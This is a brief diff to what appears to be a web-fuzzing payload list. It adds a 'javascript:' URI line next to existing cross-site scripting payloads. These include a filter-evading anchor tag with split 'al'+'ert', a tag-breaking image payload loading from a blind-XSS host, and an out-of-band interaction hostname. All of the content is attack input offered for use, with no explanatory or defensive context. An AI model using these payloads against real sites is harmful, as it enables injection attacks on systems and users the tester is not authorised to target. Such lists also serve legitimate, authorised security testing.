@@ -1,3 +1,4 @@
+Javascript:alert(1)
 qokczcptkibpknrqakvyql31huu9k7mwq.oast.fun
 <A AutoFocus HRef %252F=\"\"OnFocus=top//?.['al'%2B'ert'](1)>
 "'><img src=https://iyb.bxss.in onerror=alert(1)>
